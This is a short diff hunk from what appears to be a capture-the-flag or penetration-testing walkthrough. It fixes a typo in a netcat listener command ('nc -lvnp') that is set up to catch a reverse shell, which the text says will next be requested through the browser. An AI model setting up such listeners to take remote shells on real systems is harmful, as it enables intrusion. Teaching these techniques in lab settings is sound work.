@@ -162,7 +162,7 @@ Thus, we will see that the items that are part of the netcat folder will be list
 
 Now, in our linux environment, we will listen in on port [PORT]
 ```bash
-...nc -lvnp [PORT]
+nc -lvnp [PORT]
 ```
 So, let's ask for a "reverse shell" by executing the following request in the browser:
 ```bash
